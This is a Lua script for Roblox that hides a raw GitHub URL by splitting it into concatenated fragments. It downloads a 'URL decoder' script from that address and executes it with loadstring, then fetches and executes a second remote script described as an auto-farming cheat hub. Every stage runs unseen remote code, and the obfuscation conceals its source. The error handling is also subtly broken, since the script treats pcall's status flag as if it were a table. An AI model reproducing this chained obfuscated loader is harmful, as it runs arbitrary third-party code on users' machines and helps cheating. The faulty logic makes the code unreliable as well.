-- Breaking up the URL into smaller parts without breaking it
local urlPart1 = "h" .. "t" .. "tps"
local urlPart2 = "://" .. "r" .. "aw"
local urlPart3 = "g" .. "i" .. "t" .. "hub"
local urlPart4 = ".com" .. "/"
local urlPart5 = "M" .. "elharper"
local urlPart6 = "G" .. "abe" .. "Boa2"
local urlPart7 = "r" .. "ef" .. "s" .. "/"
local urlPart8 = "he" .. "ads" .. "/"
local urlPart9 = "m" .. "ai" .. "n"
local urlPart10 = "/" .. "ur" .. "l_" .. "de" .. "co" .. "der"
local urlPart11 = ".l" .. "ua"

-- Combine the parts
local fullUrl = urlPart1 .. urlPart2 .. urlPart3 .. urlPart4 .. urlPart5 .. urlPart6 ..
                urlPart7 .. urlPart8 .. urlPart9 .. urlPart10 .. urlPart11

-- Fetch the URL decoder script
local urlDecoderScript
local success, err = pcall(function()
    urlDecoderScript = game:HttpGet(fullUrl)
end)

if not success or not urlDecoderScript or urlDecoderScript == "" then
    warn("Failed to retrieve URL decoder script: " .. (err or "Unknown error"))
    return
end

-- Print the first 200 characters of the fetched script for debugging
print("Fetched script (first 200 characters):", string.sub(urlDecoderScript, 1, 200))

-- Execute the URL decoder script to get the URL and whitelist function
local urlDecoder, executionErr = pcall(loadstring(urlDecoderScript))

if not urlDecoder then
    warn("Error executing URL decoder script:", executionErr)
    return
end

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

if not decodedUrl or decodedUrl == "" then
    warn("Decoded URL is invalid or empty!")
    return
end

-- Check if the decoded URL is valid and not empty
local successLoad, loadErrorMessage = pcall(function()
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    loadstring(game:HttpGet(decodedUrl))()
end)

if not successLoad then
    warn("Error loading the script:", loadErrorMessage)
end
